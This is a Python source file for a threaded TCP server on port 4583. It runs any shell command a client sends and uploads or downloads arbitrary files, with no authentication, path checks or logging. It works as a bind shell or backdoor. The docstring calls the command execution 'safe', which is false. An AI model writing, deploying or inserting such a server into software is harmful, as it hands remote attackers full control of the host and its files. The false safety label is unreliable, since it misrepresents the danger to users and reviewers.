import socket
import threading
import subprocess

def execute_command(command):
    """Safely execute a command and return its output."""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout
    except Exception as e:
        return f"Error: {str(e)}"

def handle_client(client_socket):
    """Handles client requests for file transfers and commands."""
    while True:
        try:
            request = client_socket.recv(1024).decode()
            if not request:
                break

            if request.startswith("UPLOAD"):
                filename = request.split()[1]
                file_data = client_socket.recv(4096)
                with open(filename, 'wb') as file:
                    file.write(file_data)
                client_socket.send(b"File uploaded successfully.")

            elif request.startswith("COMMAND"):
                command = request[len("COMMAND "):]
                output = execute_command(command)
                client_socket.send(output.encode())

            elif request.startswith("DOWNLOAD"):
                filename = request.split()[1]
                try:
                    with open(filename, 'rb') as file:
                        file_data = file.read()
                        client_socket.send(file_data)
                except FileNotFoundError:
                    client_socket.send(b"File not found.")

            elif request.startswith("EXIT"):
                break
        except Exception:
            break

    client_socket.close()

def start_server():
    """Starts the server and accepts multiple client connections."""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 4583))
    server.listen(5)

    while True:
        client_socket, addr = server.accept()
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()

if __name__ == "__main__":
    start_server()
